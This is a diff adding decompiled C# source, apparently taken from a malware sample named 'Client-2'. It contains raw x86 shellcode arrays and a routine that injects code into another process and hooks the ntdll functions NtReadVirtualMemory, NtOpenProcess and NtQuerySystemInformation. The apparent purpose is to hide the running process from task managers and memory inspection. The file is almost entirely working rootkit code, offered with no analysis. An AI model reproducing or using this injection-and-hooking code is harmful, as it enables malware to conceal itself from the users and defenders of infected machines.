@@ -1,0 +1,1026 @@
+﻿// Decompiled with JetBrains decompiler
+// Type: Complex.cvew.ROOT1
+// Assembly: Client-2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
+// MVID: 10231E92-BCE6-4007-A463-67D77912E754
+// Assembly location: C:\Users\WDAGUtilityAccount\Desktop\5d40615701c48a122e44f831e7c8643d07765629a83b15d090587f469c77693d
+
+using Microsoft.VisualBasic.CompilerServices;
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace Complex.cvew
+{
+  [StandardModule]
+  internal sealed class ROOT1
+  {
+    private static byte[] NtReadVirtualMemory_AsmOpCode = new byte[240]
+    {
+      (byte) 85,
+      (byte) 139,
+      (byte) 236,
+      (byte) 131,
+      (byte) 236,
+      (byte) 20,
+      (byte) 86,
+      (byte) 199,
+      (byte) 69,
+      (byte) 248,
+      (byte) 1,
+      (byte) 0,
+      (byte) 0,
+      (byte) 192,
+      (byte) 232,
+      (byte) 0,
+      (byte) 0,
+      (byte) 0,
+      (byte) 0,
+      (byte) 88,
+      (byte) 37,
+      (byte) 0,
+      (byte) 240,
+      byte.MaxValue,
+      byte.MaxValue,
+      (byte) 137,
+      (byte) 69,
+      (byte) 252,
+      byte.MaxValue,
+      (byte) 117,
+      (byte) 24,
+      byte.MaxValue,
+      (byte) 117,
+      (byte) 20,
+      byte.MaxValue,
+      (byte) 117,
+      (byte) 16,
+      byte.MaxValue,
+      (byte) 117,
+      (byte) 12,
+      byte.MaxValue,
+      (byte) 117,
+      (byte) 8,
+      (byte) 139,
+      (byte) 69,
+      (byte) 252,
+      (byte) 131,
+      (byte) 192,
+      (byte) 24,
+      byte.MaxValue,
+      (byte) 208,
+      (byte) 137,
+      (byte) 69,
+      (byte) 248,
+      (byte) 131,
+      (byte) 125,
+      (byte) 248,
+      (byte) 0,
+      (byte) 15,
+      (byte) 140,
+      (byte) 168,
+      (byte) 0,
+      (byte) 0,
+      (byte) 0,
+      byte.MaxValue,
+      (byte) 117,
+      (byte) 8,
+      (byte) 139,
+      (byte) 69,
+      (byte) 252,
+      byte.MaxValue,
+      (byte) 16,
+      (byte) 139,
+      (byte) 240,
+      (byte) 139,
+      (byte) 69,
+      (byte) 252,
+      byte.MaxValue,
+      (byte) 80,
+      (byte) 4,
+      (byte) 59,
+      (byte) 240,
+      (byte) 116,
+      (byte) 10,
+      (byte) 131,
+      (byte) 125,
+      (byte) 8,
+      byte.MaxValue,
+      (byte) 15,
+      (byte) 133,
+      (byte) 138,
+      (byte) 0,
+      (byte) 0,
+      (byte) 0,
+      (byte) 131,
+      (byte) 101,
+      (byte) 244,
+      (byte) 0,
+      (byte) 235,
+      (byte) 7,
+      (byte) 139,
+      (byte) 69,
+      (byte) 244,
+      (byte) 64,
+      (byte) 137,
+      (byte) 69,
+      (byte) 244,
+      (byte) 131,
+      (byte) 125,
+      (byte) 244,
+      (byte) 3,
+      (byte) 115,
+      (byte) 119,
+      (byte) 139,
+      (byte) 69,
+      (byte) 244,
+      (byte) 139,
+      (byte) 77,
+      (byte) 252,
+      (byte) 131,
+      (byte) 124,
+      (byte) 129,
+      (byte) 12,
+      (byte) 0,
+      (byte) 116,
+      (byte) 101,
+      (byte) 139,
+      (byte) 69,
+      (byte) 244,
+      (byte) 139,
+      (byte) 77,
+      (byte) 252,
+      (byte) 139,
+      (byte) 68,
+      (byte) 129,
+      (byte) 12,
+      (byte) 59,
+      (byte) 69,
+      (byte) 12,
+      (byte) 114,
+      (byte) 86,
+      (byte) 139,
+      (byte) 69,
+      (byte) 12,
+      (byte) 3,
+      (byte) 69,
+      (byte) 20,
+      (byte) 139,
+      (byte) 77,
+      (byte) 244,
+      (byte) 139,
+      (byte) 85,
+      (byte) 252,
+      (byte) 57,
+      (byte) 68,
+      (byte) 138,
+      (byte) 12,
+      (byte) 115,
+      (byte) 68,
+      (byte) 139,
+      (byte) 69,
+      (byte) 244,
+      (byte) 139,
+      (byte) 77,
+      (byte) 252,
+      (byte) 139,
+      (byte) 68,
+      (byte) 129,
+      (byte) 12,
+      (byte) 43,
+      (byte) 69,
+      (byte) 12,
+      (byte) 137,
+      (byte) 69,
+      (byte) 240,
+      (byte) 131,
+      (byte) 101,
+      (byte) 236,
+      (byte) 0,
+      (byte) 235,
+      (byte) 7,
+      (byte) 139,
+      (byte) 69,
+      (byte) 236,
+      (byte) 64,
+      (byte) 137,
+      (byte) 69,
+      (byte) 236,
+      (byte) 131,
+      (byte) 125,
+      (byte) 236,
+      (byte) 24,
+      (byte) 115,
+      (byte) 33,
+      (byte) 139,
+      (byte) 69,
+      (byte) 244,
+      (byte) 107,
+      (byte) 192,
+      (byte) 24,
+      (byte) 139,
+      (byte) 77,
+      (byte) 252,
+      (byte) 141,
+      (byte) 68,
+      (byte) 1,
+      (byte) 24,
+      (byte) 139,
+      (byte) 77,
+      (byte) 236,
+      (byte) 3,
+      (byte) 77,
+      (byte) 240,
+      (byte) 139,
+      (byte) 85,
+      (byte) 16,
+      (byte) 139,
+      (byte) 117,
+      (byte) 236,
+      (byte) 138,
+      (byte) 4,
+      (byte) 48,
+      (byte) 136,
+      (byte) 4,
+      (byte) 10,
+      (byte) 235,
+      (byte) 210,
+      (byte) 233,
+      (byte) 124,
+      byte.MaxValue,
+      byte.MaxValue,
+      byte.MaxValue,
+      (byte) 139,
+      (byte) 69,
+      (byte) 248,
+      (byte) 94,
+      (byte) 201,
+      (byte) 194,
+      (byte) 20,
+      (byte) 0
+    };
+    private static byte[] NtOpenProcess_AsmOpCode = new byte[84]
+    {
+      (byte) 85,
+      (byte) 139,
+      (byte) 236,
+      (byte) 81,
+      (byte) 81,
+      (byte) 199,
+      (byte) 69,
+      (byte) 248,
+      (byte) 1,
+      (byte) 0,
+      (byte) 0,
+      (byte) 192,
+      (byte) 232,
+      (byte) 0,
+      (byte) 0,
+      (byte) 0,
+      (byte) 0,
+      (byte) 88,
+      (byte) 37,
+      (byte) 0,
+      (byte) 240,
+      byte.MaxValue,
+      byte.MaxValue,
+      (byte) 137,
+      (byte) 69,
+      (byte) 252,
+      (byte) 131,
+      (byte) 125,
+      (byte) 20,
+      (byte) 0,
+      (byte) 116,
+      (byte) 22,
+      (byte) 139,
+      (byte) 69,
+      (byte) 20,
+      (byte) 139,
+      (byte) 77,
+      (byte) 252,
+      (byte) 139,
+      (byte) 0,
+      (byte) 59,
+      (byte) 65,
+      (byte) 8,
+      (byte) 117,
+      (byte) 9,
+      (byte) 199,
+      (byte) 69,
+      (byte) 248,
+      (byte) 34,
+      (byte) 0,
+      (byte) 0,
+      (byte) 192,
+      (byte) 235,
+      (byte) 23,
+      byte.MaxValue,
+      (byte) 117,
+      (byte) 20,
+      byte.MaxValue,
+      (byte) 117,
+      (byte) 16,
+      byte.MaxValue,
+      (byte) 117,
+      (byte) 12,
+      byte.MaxValue,
+      (byte) 117,
+      (byte) 8,
+      (byte) 139,
+      (byte) 69,
+      (byte) 252,
+      (byte) 131,
+      (byte) 192,
+      (byte) 48,
+      byte.MaxValue,
+      (byte) 208,
+      (byte) 137,
+      (byte) 69,
+      (byte) 248,
+      (byte) 139,
+      (byte) 69,
+      (byte) 248,
+      (byte) 201,
+      (byte) 194,
+      (byte) 16,
+      (byte) 0
+    };
+    private static byte[] NtQuerySystemInformation_AsmOpCode = new byte[405]
+    {
+      (byte) 85,
+      (byte) 139,
+      (byte) 236,
+      (byte) 131,
+      (byte) 236,
+      (byte) 28,
+      (byte) 86,
+      (byte) 87,
+      (byte) 199,
+      (byte) 69,
+      (byte) 236,
+      (byte) 1,
+      (byte) 0,
+      (byte) 0,
+      (byte) 192,
+      (byte) 232,
+      (byte) 0,
+      (byte) 0,
+      (byte) 0,
+      (byte) 0,
+      (byte) 88,
+      (byte) 37,
+      (byte) 0,
+      (byte) 240,
+      byte.MaxValue,
+      byte.MaxValue,
+      (byte) 137,
+      (byte) 69,
+      (byte) 240,
+      byte.MaxValue,
+      (byte) 117,
+      (byte) 20,
+      byte.MaxValue,
+      (byte) 117,
+      (byte) 16,
+      byte.MaxValue,
+      (byte) 117,
+      (byte) 12,
+      byte.MaxValue,
+      (byte) 117,
+      (byte) 8,
+      (byte) 139,
+      (byte) 69,
+      (byte) 240,
+      (byte) 131,
+      (byte) 192,
+      (byte) 72,
+      byte.MaxValue,
+      (byte) 208,
+      (byte) 137,
+      (byte) 69,
+      (byte) 236,
+      (byte) 131,
+      (byte) 125,
+      (byte) 236,
+      (byte) 0,
+      (byte) 15,
+      (byte) 140,
+      (byte) 78,
+      (byte) 1,
+      (byte) 0,
+      (byte) 0,
+      (byte) 131,
+      (byte) 125,
+      (byte) 8,
+      (byte) 5,
+      (byte) 117,
+      (byte) 93,
+      (byte) 131,
+      (byte) 101,
+      (byte) 248,
+      (byte) 0,
+      (byte) 139,
+      (byte) 69,
+      (byte) 12,
+      (byte) 137,
+      (byte) 69,
+      (byte) 244,
+      (byte) 139,
+      (byte) 69,
+      (byte) 244,
+      (byte) 131,
+      (byte) 56,
+      (byte) 0,
+      (byte) 116,
+      (byte) 70,
+      (byte) 139,
+      (byte) 69,
+      (byte) 244,
+      (byte) 137,
+      (byte) 69,
+      (byte) 248,
+      (byte) 139,
+      (byte) 69,
+      (byte) 248,
+      (byte) 139,
+      (byte) 77,
+      (byte) 248,
+      (byte) 3,
+      (byte) 8,
+      (byte) 137,
+      (byte) 77,
+      (byte) 244,
+      (byte) 139,
+      (byte) 69,
+      (byte) 244,
+      (byte) 139,
+      (byte) 77,
+      (byte) 240,
+      (byte) 139,
+      (byte) 64,
+      (byte) 68,
+      (byte) 59,
+      (byte) 65,
+      (byte) 8,
+      (byte) 117,
+      (byte) 37,
+      (byte) 139,
+      (byte) 69,
+      (byte) 244,
+      (byte) 131,
+      (byte) 56,
+      (byte) 0,
+      (byte) 117,
+      (byte) 8,
+      (byte) 139,
+      (byte) 69,
+      (byte) 248,
+      (byte) 131,
+      (byte) 32,
+      (byte) 0,
+      (byte) 235,
+      (byte) 15,
+      (byte) 139,
+      (byte) 69,
+      (byte) 248,
+      (byte) 139,
+      (byte) 0,
+      (byte) 139,
+      (byte) 77,
+      (byte) 244,
+      (byte) 3,
+      (byte) 1,
+      (byte) 139,
+      (byte) 77,
+      (byte) 248,
+      (byte) 137,
+      (byte) 1,
+      (byte) 139,
+      (byte) 69,
+      (byte) 248,
+      (byte) 137,
+      (byte) 69,
+      (byte) 244,
+      (byte) 235,
+      (byte) 178,
+      (byte) 233,
+      (byte) 235,
+      (byte) 0,
+      (byte) 0,
+      (byte) 0,
+      (byte) 131,
+      (byte) 125,
+      (byte) 8,
+      (byte) 16,
+      (byte) 15,
+      (byte) 133,
+      (byte) 225,
+      (byte) 0,
+      (byte) 0,
+      (byte) 0,
+      (byte) 139,
+      (byte) 69,
+      (byte) 12,
+      (byte) 137,
+      (byte) 69,
+      (byte) 252,
+      (byte) 131,
+      (byte) 101,
+      (byte) 232,
+      (byte) 0,
+      (byte) 235,
+      (byte) 7,
+      (byte) 139,
+      (byte) 69,
+      (byte) 232,
+      (byte) 64,
+      (byte) 137,
+      (byte) 69,
+      (byte) 232,
+      (byte) 139,
+      (byte) 69,
+      (byte) 252,
+      (byte) 139,
+      (byte) 77,
+      (byte) 232,
+      (byte) 59,
+      (byte) 8,
+      (byte) 15,
+      (byte) 131,
+      (byte) 192,
+      (byte) 0,
+      (byte) 0,
+      (byte) 0,
+      (byte) 139,
+      (byte) 69,
+      (byte) 232,
+      (byte) 193,
+      (byte) 224,
+      (byte) 4,
+      (byte) 139,
+      (byte) 77,
+      (byte) 252,
+      (byte) 139,
+      (byte) 85,
+      (byte) 240,
+      (byte) 139,
+      (byte) 68,
+      (byte) 1,
+      (byte) 4,
+      (byte) 59,
+      (byte) 66,
+      (byte) 8,
+      (byte) 15,
+      (byte) 133,
+      (byte) 162,
+      (byte) 0,
+      (byte) 0,
+      (byte) 0,
+      (byte) 139,
+      (byte) 69,
+      (byte) 232,
+      (byte) 193,
+      (byte) 224,
+      (byte) 4,
+      (byte) 139,
+      (byte) 77,
+      (byte) 252,
+      (byte) 198,
+      (byte) 68,
+      (byte) 1,
+      (byte) 9,
+      (byte) 0,
+      (byte) 139,
+      (byte) 69,
+      (byte) 232,
+      (byte) 193,
+      (byte) 224,
+      (byte) 4,
+      (byte) 139,
+      (byte) 77,
+      (byte) 252,
+      (byte) 131,
+      (byte) 100,
+      (byte) 1,
+      (byte) 16,
+      (byte) 0,
+      (byte) 139,
+      (byte) 69,
+      (byte) 232,
+      (byte) 193,
+      (byte) 224,
+      (byte) 4,
+      (byte) 51,
+      (byte) 201,
+      (byte) 139,
+      (byte) 85,
+      (byte) 252,
+      (byte) 102,
+      (byte) 137,
+      (byte) 76,
+      (byte) 2,
+      (byte) 10,
+      (byte) 139,
+      (byte) 69,
+      (byte) 232,
+      (byte) 193,
+      (byte) 224,
+      (byte) 4,
+      (byte) 139,
+      (byte) 77,
+      (byte) 252,
+      (byte) 131,
+      (byte) 100,
+      (byte) 1,
+      (byte) 12,
+      (byte) 0,
+      (byte) 139,
+      (byte) 69,
+      (byte) 232,
+      (byte) 193,
+      (byte) 224,
+      (byte) 4,
+      (byte) 139,
+      (byte) 77,
+      (byte) 252,
+      (byte) 198,
+      (byte) 68,
+      (byte) 1,
+      (byte) 8,
+      (byte) 0,
+      (byte) 139,
+      (byte) 69,
+      (byte) 232,
+      (byte) 193,
+      (byte) 224,
+      (byte) 4,
+      (byte) 139,
+      (byte) 77,
+      (byte) 252,
+      (byte) 131,
+      (byte) 100,
+      (byte) 1,
+      (byte) 4,
+      (byte) 0,
+      (byte) 139,
+      (byte) 69,
+      (byte) 232,
+      (byte) 137,
+      (byte) 69,
+      (byte) 228,
+      (byte) 235,
+      (byte) 7,
+      (byte) 139,
+      (byte) 69,
+      (byte) 228,
+      (byte) 64,
+      (byte) 137,
+      (byte) 69,
+      (byte) 228,
+      (byte) 139,
+      (byte) 69,
+      (byte) 252,
+      (byte) 139,
+      (byte) 77,
+      (byte) 228,
+      (byte) 59,
+      (byte) 8,
+      (byte) 115,
+      (byte) 33,
+      (byte) 139,
+      (byte) 69,
+      (byte) 228,
+      (byte) 64,
+      (byte) 193,
+      (byte) 224,
+      (byte) 4,
+      (byte) 139,
+      (byte) 77,
+      (byte) 252,
+      (byte) 141,
+      (byte) 116,
+      (byte) 1,
+      (byte) 4,
+      (byte) 139,
+      (byte) 69,
+      (byte) 228,
+      (byte) 193,
+      (byte) 224,
+      (byte) 4,
+      (byte) 139,
+      (byte) 77,
+      (byte) 252,
+      (byte) 141,
+      (byte) 124,
+      (byte) 1,
+      (byte) 4,
+      (byte) 165,
+      (byte) 165,
+      (byte) 165,
+      (byte) 165,
+      (byte) 235,
+      (byte) 206,
+      (byte) 139,
+      (byte) 69,
+      (byte) 252,
+      (byte) 139,
+      (byte) 0,
+      (byte) 72,
+      (byte) 139,
+      (byte) 77,
+      (byte) 252,
+      (byte) 137,
+      (byte) 1,
+      (byte) 139,
+      (byte) 69,
+      (byte) 232,
+      (byte) 72,
+      (byte) 137,
+      (byte) 69,
+      (byte) 232,
+      (byte) 233,
+      (byte) 43,
+      byte.MaxValue,
+      byte.MaxValue,
+      byte.MaxValue,
+      (byte) 139,
+      (byte) 69,
+      (byte) 236,
+      (byte) 95,
+      (byte) 94,
+      (byte) 201,
+      (byte) 194,
+      (byte) 16,
+      (byte) 0
+    };
+
+    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
+    private static extern bool CloseHandle(IntPtr pHandle);
+
+    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
+    private static extern IntPtr OpenProcess(
+      int dwDesiredAccess,
+      bool bInheritHandle,
+      uint dwProcessId);
+
+    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
+    private static extern bool ReadProcessMemory(
+      IntPtr hProcess,
+      IntPtr lpBaseAddress,
+      [Out] byte[] lpBuffer,
+      uint nSize,
+      ref uint lpNumberOfBytesRead);
+
+    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
+    private static extern bool WriteProcessMemory(
+      IntPtr hProcess,
+      IntPtr lpBaseAddress,
+      byte[] lpBuffer,
+      uint nSize,
+      ref uint lpNumberOfBytesWritten);
+
+    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
+    private static extern bool VirtualProtectEx(
+      IntPtr hProcess,
+      IntPtr lpAddress,
+      uint dwSize,
+      uint flNewProtect,
+      ref uint lpflOldProtect);
+
+    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
+    private static extern bool Module32Next(IntPtr hSnapshot, ref ROOT1.MODULEENTRY32 lpme);
+
+    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
+    private static extern bool Module32First(IntPtr hSnapshot, ref ROOT1.MODULEENTRY32 lpme);
+
+    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
+    private static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint u32ProcessId);
+
+    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
+    private static extern IntPtr VirtualAllocEx(
+      IntPtr hProcess,
+      IntPtr lpAddress,
+      uint dwSize,
+      uint flAllocationType,
+      uint flProtect);
+
+    private static byte[] ReadMemoryByte(IntPtr hProcess, IntPtr lpBaseAddress, uint nSize)
+    {
+      byte[] numArray = new byte[checked ((int) ((ulong) nSize - 1UL) + 1)];
+      byte[] lpBuffer = numArray;
+      uint lpNumberOfBytesRead = 0;
+      ROOT1.ReadProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesRead);
+      return numArray;
+    }
+
+    private static uint RemoteGetProcAddressManual(
+      IntPtr hProcess,
+      uint ModuleAddress,
+      string Export)
+    {
+      uint uint32_1 = BitConverter.ToUInt32(ROOT1.ReadMemoryByte(hProcess, (IntPtr) checked ((long) ((ulong) ModuleAddress + 60UL)), 4U), 0);
+      uint uint32_2 = BitConverter.ToUInt32(ROOT1.ReadMemoryByte(hProcess, (IntPtr) checked ((long) ((ulong) (ModuleAddress + uint32_1) + 120UL)), 4U), 0);
+      byte[] numArray = ROOT1.ReadMemoryByte(hProcess, (IntPtr) (long) checked (ModuleAddress + uint32_2), 40U);
+      int int32 = BitConverter.ToInt32(numArray, 24);
+      uint num1 = checked (BitConverter.ToUInt32(numArray, 32) + ModuleAddress);
+      uint num2 = checked (BitConverter.ToUInt32(numArray, 28) + ModuleAddress);
+      uint num3 = checked (BitConverter.ToUInt32(numArray, 36) + ModuleAddress);
+      IntPtr num4 = Marshal.AllocHGlobal(64);
+      int num5 = 1;
+      int num6 = int32;
+      int num7 = num5;
+      uint procAddressManual;
+      while (true)
+      {
+        if (num7 <= num6)
+        {
+          uint uint32_3 = BitConverter.ToUInt32(ROOT1.ReadMemoryByte(hProcess, (IntPtr) checked ((long) ((ulong) num1 + (ulong) ((num7 - 1) * 4))), 4U), 0);
+          Marshal.Copy(ROOT1.ReadMemoryByte(hProcess, (IntPtr) (long) checked (ModuleAddress + uint32_3), 64U), 0, num4, 64);
+          string stringAnsi = Marshal.PtrToStringAnsi(num4);
+          uint int16 = checked ((uint) BitConverter.ToInt16(ROOT1.ReadMemoryByte(hProcess, (IntPtr) (long) ((ulong) num3 + (ulong) ((num7 - 1) * 2)), 2U), 0));
+          procAddressManual = checked (BitConverter.ToUInt32(ROOT1.ReadMemoryByte(hProcess, (IntPtr) (long) ((ulong) num2 + (ulong) int16 * 4UL), 4U), 0) + ModuleAddress);
+          if (string.Compare(stringAnsi, Export, true) != 0)
+            checked { ++num7; }
+          else
+            break;
+        }
+        else
+          goto label_5;
+      }
+      Marshal.FreeHGlobal(num4);
+      return procAddressManual;
+label_5:
+      Marshal.FreeHGlobal(num4);
+      return 0;
+    }
+
+    private static IntPtr GetModuleBaseAddress(string strProcess, string strModule)
+    {
+      IntPtr toolhelp32Snapshot = ROOT1.CreateToolhelp32Snapshot(24U, checked ((uint) Process.GetProcessesByName(strProcess)[0].Id));
+      IntPtr zero = IntPtr.Zero;
+      IntPtr moduleBaseAddress;
+      if (toolhelp32Snapshot == zero)
+      {
+        moduleBaseAddress = zero;
+      }
+      else
+      {
+        ROOT1.MODULEENTRY32 lpme = new ROOT1.MODULEENTRY32();
+        lpme.U32Size = checked ((uint) Marshal.SizeOf<ROOT1.MODULEENTRY32>(lpme));
+        if (ROOT1.Module32First(toolhelp32Snapshot, ref lpme))
+        {
+          do
+          {
+            if (lpme.ModBaseAddr.ToInt64() <= (long) int.MaxValue && string.Compare(strModule, lpme.SzModule, true) == 0)
+              goto label_5;
+          }
+          while (ROOT1.Module32Next(toolhelp32Snapshot, ref lpme));
+          goto label_6;
+label_5:
+          return lpme.ModBaseAddr;
+        }
+label_6:
+        moduleBaseAddress = zero;
+      }
+      return moduleBaseAddress;
+    }
+
+    private static int CalculateOffset(int DesAddress, int SrcAddress) => checked (DesAddress - SrcAddress - 5);
+
+    public static void HookApplication(string ProcessName)
+    {
+      byte[] numArray1 = new byte[97];
+      uint[] numArray2 = new uint[4];
+      byte[][] numArray3 = new byte[4][];
+      uint lpflOldProtect1 = 0;
+      byte[] numArray4 = new byte[5]
+      {
+        (byte) 233,
+        (byte) 0,
+        (byte) 0,
+        (byte) 0,
+        (byte) 0
+      };
+      byte[][] numArray5 = new byte[3][]
+      {
+        ROOT1.NtReadVirtualMemory_AsmOpCode,
+        ROOT1.NtOpenProcess_AsmOpCode,
+        ROOT1.NtQuerySystemInformation_AsmOpCode
+      };
+      uint num1 = checked ((uint) (numArray5[0].Length + numArray5[1].Length + numArray5[2].Length));
+      IntPtr num2 = ROOT1.OpenProcess(56, false, checked ((uint) Process.GetProcessesByName(ProcessName)[0].Id));
+      IntPtr zero = IntPtr.Zero;
+      uint num3 = checked ((uint) (int) ROOT1.VirtualAllocEx(num2, zero, (uint) ((ulong) num1 + 96UL), 12288U, 64U));
+      uint procAddressManual1 = checked ((uint) (int) ROOT1.RemoteGetProcAddressManual(num2, (uint) (int) ROOT1.GetModuleBaseAddress(ProcessName, "kernel32.dll"), "GetProcessId"));
+      uint procAddressManual2 = checked ((uint) (int) ROOT1.RemoteGetProcAddressManual(num2, (uint) (int) ROOT1.GetModuleBaseAddress(ProcessName, "kernel32.dll"), "GetCurrentProcessId"));
+      numArray2[0] = checked ((uint) (int) ROOT1.RemoteGetProcAddressManual(num2, (uint) (int) ROOT1.GetModuleBaseAddress(ProcessName, "ntdll.dll"), "NtReadVirtualMemory"));
+      numArray2[1] = checked ((uint) (int) ROOT1.RemoteGetProcAddressManual(num2, (uint) (int) ROOT1.GetModuleBaseAddress(ProcessName, "ntdll.dll"), "NtOpenProcess"));
+      numArray2[2] = checked ((uint) (int) ROOT1.RemoteGetProcAddressManual(num2, (uint) (int) ROOT1.GetModuleBaseAddress(ProcessName, "ntdll.dll"), "NtQuerySystemInformation"));
+      numArray3[0] = ROOT1.ReadMemoryByte(num2, (IntPtr) (long) numArray2[0], 24U);
+      numArray3[1] = ROOT1.ReadMemoryByte(num2, (IntPtr) (long) numArray2[1], 24U);
+      numArray3[2] = ROOT1.ReadMemoryByte(num2, (IntPtr) (long) numArray2[2], 24U);
+      BitConverter.GetBytes(procAddressManual1).CopyTo((Array) numArray1, 0);
+      BitConverter.GetBytes(procAddressManual2).CopyTo((Array) numArray1, 4);
+      BitConverter.GetBytes(Process.GetCurrentProcess().Id).CopyTo((Array) numArray1, 8);
+      BitConverter.GetBytes(numArray2[0]).CopyTo((Array) numArray1, 12);
+      BitConverter.GetBytes(numArray2[1]).CopyTo((Array) numArray1, 16);
+      BitConverter.GetBytes(numArray2[2]).CopyTo((Array) numArray1, 20);
+      numArray3[0].CopyTo((Array) numArray1, 24);
+      numArray3[1].CopyTo((Array) numArray1, 48);
+      numArray3[2].CopyTo((Array) numArray1, 72);
+      uint num4 = num3;
+      IntPtr hProcess1 = num2;
+      IntPtr lpBaseAddress1 = (IntPtr) (long) num4;
+      byte[] lpBuffer1 = numArray1;
+      uint nSize = 96;
+      uint lpNumberOfBytesWritten1 = 0;
+      ROOT1.WriteProcessMemory(hProcess1, lpBaseAddress1, lpBuffer1, nSize, ref lpNumberOfBytesWritten1);
+      uint num5 = checked ((uint) ((ulong) num4 + 96UL));
+      int num6 = 0;
+      int num7 = checked (numArray5.Length - 1);
+      int index = num6;
+      while (true)
+      {
+        if (index <= num7)
+        {
+          IntPtr hProcess2 = num2;
+          IntPtr lpBaseAddress2 = (IntPtr) (long) num5;
+          byte[] lpBuffer2 = numArray5[index];
+          uint length = checked ((uint) numArray5[index].Length);
+          uint lpNumberOfBytesWritten2 = 0;
+          ROOT1.WriteProcessMemory(hProcess2, lpBaseAddress2, lpBuffer2, length, ref lpNumberOfBytesWritten2);
+          num5 = checked ((uint) ((ulong) num5 + (ulong) numArray5[index].Length));
+          checked { ++index; }
+        }
+        else
+          break;
+      }
+      IntPtr hProcess3 = num2;
+      IntPtr lpAddress1 = (IntPtr) (long) num3;
+      uint dwSize = checked ((uint) ((ulong) num1 + 96UL));
+      uint flNewProtect1 = 16;
+      uint lpflOldProtect2 = 0;
+      ROOT1.VirtualProtectEx(hProcess3, lpAddress1, dwSize, flNewProtect1, ref lpflOldProtect2);
+      uint DesAddress1 = checked ((uint) ((ulong) num3 + 96UL));
+      BitConverter.GetBytes(ROOT1.CalculateOffset(checked ((int) DesAddress1), checked ((int) numArray2[0]))).CopyTo((Array) numArray4, 1);
+      ROOT1.VirtualProtectEx(num2, (IntPtr) (long) numArray2[0], checked ((uint) numArray4.Length), 64U, ref lpflOldProtect1);
+      IntPtr hProcess4 = num2;
+      IntPtr lpBaseAddress3 = (IntPtr) (long) numArray2[0];
+      byte[] lpBuffer3 = numArray4;
+      uint length1 = checked ((uint) numArray4.Length);
+      uint lpNumberOfBytesWritten3 = 0;
+      ROOT1.WriteProcessMemory(hProcess4, lpBaseAddress3, lpBuffer3, length1, ref lpNumberOfBytesWritten3);
+      IntPtr hProcess5 = num2;
+      IntPtr lpAddress2 = (IntPtr) (long) numArray2[0];
+      uint length2 = checked ((uint) numArray4.Length);
+      uint flNewProtect2 = lpflOldProtect1;
+      uint lpflOldProtect3 = 0;
+      ROOT1.VirtualProtectEx(hProcess5, lpAddress2, length2, flNewProtect2, ref lpflOldProtect3);
+      uint DesAddress2 = checked ((uint) ((ulong) DesAddress1 + (ulong) numArray5[0].Length));
+      BitConverter.GetBytes(ROOT1.CalculateOffset(checked ((int) DesAddress2), checked ((int) numArray2[1]))).CopyTo((Array) numArray4, 1);
+      ROOT1.VirtualProtectEx(num2, (IntPtr) (long) numArray2[1], checked ((uint) numArray4.Length), 64U, ref lpflOldProtect1);
+      IntPtr hProcess6 = num2;
+      IntPtr lpBaseAddress4 = (IntPtr) (long) numArray2[1];
+      byte[] lpBuffer4 = numArray4;
+      uint length3 = checked ((uint) numArray4.Length);
+      uint lpNumberOfBytesWritten4 = 0;
+      ROOT1.WriteProcessMemory(hProcess6, lpBaseAddress4, lpBuffer4, length3, ref lpNumberOfBytesWritten4);
+      IntPtr hProcess7 = num2;
+      IntPtr lpAddress3 = (IntPtr) (long) numArray2[1];
+      uint length4 = checked ((uint) numArray4.Length);
+      uint flNewProtect3 = lpflOldProtect1;
+      uint lpflOldProtect4 = 0;
+      ROOT1.VirtualProtectEx(hProcess7, lpAddress3, length4, flNewProtect3, ref lpflOldProtect4);
+      BitConverter.GetBytes(ROOT1.CalculateOffset(checked ((int) (uint) ((ulong) DesAddress2 + (ulong) numArray5[1].Length)), checked ((int) numArray2[2]))).CopyTo((Array) numArray4, 1);
+      ROOT1.VirtualProtectEx(num2, (IntPtr) (long) numArray2[2], checked ((uint) numArray4.Length), 64U, ref lpflOldProtect1);
+      IntPtr hProcess8 = num2;
+      IntPtr lpBaseAddress5 = (IntPtr) (long) numArray2[2];
+      byte[] lpBuffer5 = numArray4;
+      uint length5 = checked ((uint) numArray4.Length);
+      uint lpNumberOfBytesWritten5 = 0;
+      ROOT1.WriteProcessMemory(hProcess8, lpBaseAddress5, lpBuffer5, length5, ref lpNumberOfBytesWritten5);
+      IntPtr hProcess9 = num2;
+      IntPtr lpAddress4 = (IntPtr) (long) numArray2[2];
+      uint length6 = checked ((uint) numArray4.Length);
+      uint flNewProtect4 = lpflOldProtect1;
+      uint lpflOldProtect5 = 0;
+      ROOT1.VirtualProtectEx(hProcess9, lpAddress4, length6, flNewProtect4, ref lpflOldProtect5);
+      ROOT1.CloseHandle(num2);
+    }
+
+    public struct MODULEENTRY32
+    {
+      public uint U32Size;
+      public uint Th32ModuleId;
+      public uint Th32ProcessId;
+      public uint GlblcntUsage;
+      public uint ProccntUsage;
+      public IntPtr ModBaseAddr;
+      public uint ModBaseSize;
+      public IntPtr HModule;
+      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
+      public string SzModule;
+      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
+      public string SzeExePath;
+    }
+  }
+}
